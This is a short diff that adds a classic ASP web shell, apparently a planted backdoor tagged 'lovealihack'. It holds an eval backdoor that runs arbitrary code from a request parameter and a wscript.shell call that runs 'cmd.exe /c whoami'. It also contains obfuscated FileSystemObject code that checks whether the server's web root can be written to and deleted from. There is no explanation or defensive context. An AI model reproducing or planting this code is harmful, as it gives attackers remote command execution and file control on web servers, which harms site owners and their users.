@@ -1,0 +1,35 @@
+lovealihack<%eval request("alihack.com")%>
+<%On Error Resume Next
+Response.write CreateObject("wscript.shell").exec("cmd.exe /c whoami").StdOut.ReadAll%>|
+<%Set Fso=server.createobject("scr"&"ipt"&"ing"&"."&"fil"&"esy"&"ste"&"mob"&"jec"&"t")
+sPath=replace(Server.MapPath("\"),"/", "\")
+Function CheckDirIsOKWrite(DirStr)
+On Error Resume Next
+Fso.CreateTextFile(DirStr&"\temp.tmp")
+if Err.number<>0 then
+Err.Clear()
+response.write ""
+CheckDirIsOKWrite=0
+else
+response.write "write"
+CheckDirIsOKWrite=1
+end if
+End Function
+Function CheckDirIsOKDel(DirStr)
+On Error Resume Next
+Fso.DeleteFile(DirStr&"\temp.tmp")
+if Err.number<>0 then
+Err.Clear()
+response.write ""
+else
+response.write "delete"
+end if
+End Function
+Function WriteSpace(NunStr)
+for iu=0 to NunStr
+response.write " "
+next
+End Function
+IsWrite=CheckDirIsOKWrite(sPath)
+if IsWrite=1 then CheckDirIsOKDel(sPath)
+%>
